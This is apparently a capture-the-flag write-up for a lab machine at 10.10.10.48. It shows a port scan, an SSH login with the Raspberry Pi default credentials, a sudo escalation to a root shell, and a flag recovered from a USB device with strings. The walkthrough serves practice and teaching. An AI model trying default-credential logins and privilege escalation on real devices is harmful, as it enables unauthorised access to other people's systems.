
| PORT      | STATE | SERVICE | VERSION                                                       |
| --------- | ----- | ------- | ------------------------------------------------------------- |
| 22/tcp    | open  | ssh     | OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)                  |
|           |       |         | **SSH Hostkeys:**                                             |
|           |       |         | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)    |
|           |       |         | 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)    |
|           |       |         | 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)   |
|           |       |         | 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519) |
| 53/tcp    | open  | domain  | dnsmasq 2.76                                                  |
|           |       |         | **DNS Version:**                                              |
|           |       |         | dnsmasq-2.76                                                  |
| 80/tcp    | open  | http    | lighttpd 1.4.35                                               |
|           |       |         | **HTTP Info:**                                                |
|           |       |         | Title: Site doesn't have a title                              |
|           |       |         | Server Header: lighttpd/1.4.35                                |
|           |       |         |                                                               |
| 32400/tcp | open  | http    |                                                               |
|           |       |         |                                                               |
|           |       |         |                                                               |
|           |       |         |                                                               |


# User

```bash
ssh pi@10.10.10.48
raspberry
```


# ROOT

```bash
pi@raspberrypi:~/Desktop $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL


pi@raspberrypi:~/Desktop $ sudo -u root /bin/bash
```

```bash
root@raspberrypi:~# strings /dev/sdb -n 32
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
```